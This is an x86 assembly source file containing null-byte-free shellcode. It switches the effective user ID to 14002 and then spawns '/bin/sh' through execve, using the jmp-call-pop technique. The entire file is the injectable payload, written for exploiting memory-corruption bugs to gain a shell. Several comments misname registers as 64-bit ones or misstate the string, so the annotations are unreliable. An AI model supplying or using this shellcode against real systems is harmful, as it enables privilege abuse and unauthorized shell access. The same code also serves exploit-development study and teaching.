BITS 32

global _start
jmp short t

_start:
	xor eax, eax
	mov al, 0xd0 ; setuid syscall number
	mov ebx, -1
	xor ecx, ecx
	mov cx, 14002 ; the uid to change to
	mov edx, -1

	int 0x80

	; To call execve with shell, we need the program's name, an array of the name and then
	;	a NULL and a pointer to a NULL.
	; Since we can't retminate the string and add NULLs in the code (to prevent)
	;	nullbytes), we'll generate them dynamically
	xor eax, eax
	pop ebx ; rbx = &msg
	; Put values in registers for syscall. String's address is already in rdi
	lea ecx, [ebx + 8] ; put the array address in rdi
	lea edx, [ebx + 12] ; Put the NULL address in rdx

	mov [ebx + 7], al ; Null terminate the string
	mov [ecx], ebx ; Put the address of the string instead of the AAAA
	mov [edx], eax ; Put a NULL instead of the BBBB, to mark the end of arr

	mov al, 11 ; the execve syscall number
	int 0x80

	; exit properly
	; mov al, 60
	; xor rdi, rdi
	; syscall

t:
	call _start
	; X is a place holder for a NULL string terminator, AAAA is for the address
	;	of the string "/bin/shell" and BBBB is for a NULL array terminator
	msg db "/bin/sh"
